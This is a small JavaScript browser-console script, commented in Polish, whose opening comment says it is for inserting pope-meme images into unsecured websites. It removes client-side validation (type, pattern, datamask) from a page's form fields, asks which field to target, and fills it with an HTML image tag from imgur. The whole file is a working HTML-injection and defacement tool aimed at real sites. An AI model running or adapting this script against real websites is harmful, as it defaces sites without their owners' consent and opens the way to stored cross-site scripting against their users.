//skrypt do wstawiania papiezakow na niezabezpieczone strony

var form = document.querySelector('form');

if (form) {
	var inputs = form.getElementsByTagName('input');
	console.log("[!] wyzerowano type, pattern i datamask");
	for (var i = 0; i < inputs.length; i++) {
		if(inputs[i].type != "submit"){
			inputs[i].type = "text";
		}
		inputs[i].pattern = "";
		inputs[i].datamask = "";
		if(inputs[i].name != ""){
			console.log(inputs[i].name);
		}else{
			console.log("[!] input bez name");
		}
	}
	var wybrane_pole = prompt('podaj pole')	

	for (var i = 0; i < inputs.length; i++) {
		if(wybrane_pole == inputs[i].name){
			inputs[i].value = "<img src=https://i.imgur.com/1qHrNFs.jpeg>"
			break;
		}
	}

} else {
	console.log('ni ma forma');
}
